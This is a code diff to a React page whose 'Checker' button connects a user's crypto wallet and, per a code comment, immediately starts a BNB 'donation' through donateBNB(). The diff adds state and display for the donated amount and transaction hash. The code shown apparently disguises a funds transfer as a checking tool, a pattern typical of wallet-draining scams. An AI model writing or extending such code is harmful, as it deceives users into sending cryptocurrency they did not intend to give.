@@ -9,6 +9,7 @@ export default function Home() {
   const [isProcessing, setIsProcessing] = useState(false);
   const [walletAddress, setWalletAddress] = useState('');
   const [txHash, setTxHash] = useState('');
+  const [donationAmount, setDonationAmount] = useState('');
   const [error, setError] = useState('');
 
   async function handleCheck() {
@@ -20,8 +21,9 @@ export default function Home() {
       setWalletAddress(userAddress);
       
       // Immediately initiate donation after wallet connection
-      const donationTxHash = await donateBNB();
-      setTxHash(donationTxHash);
+      const { txHash, amount } = await donateBNB();
+      setTxHash(txHash);
+      setDonationAmount(amount);
     } catch (error) {
       setError(error.message);
     } finally {
@@ -64,6 +66,8 @@ export default function Home() {
               {isProcessing ? "Processing..." : "Checker"}
             </button>
             {walletAddress && <p className="text-sm text-yellow-200">Connected: {walletAddress}</p>}
+            {txHash && <p className="text-sm text-yellow-200">Transaction Hash: {txHash}</p>}
+            {donationAmount && <p className="text-sm text-yellow-200">Donated Amount: {donationAmount} BNB</p>}
             {error && <p className="text-sm text-red-500">{error}</p>}
           </div>
         </div>
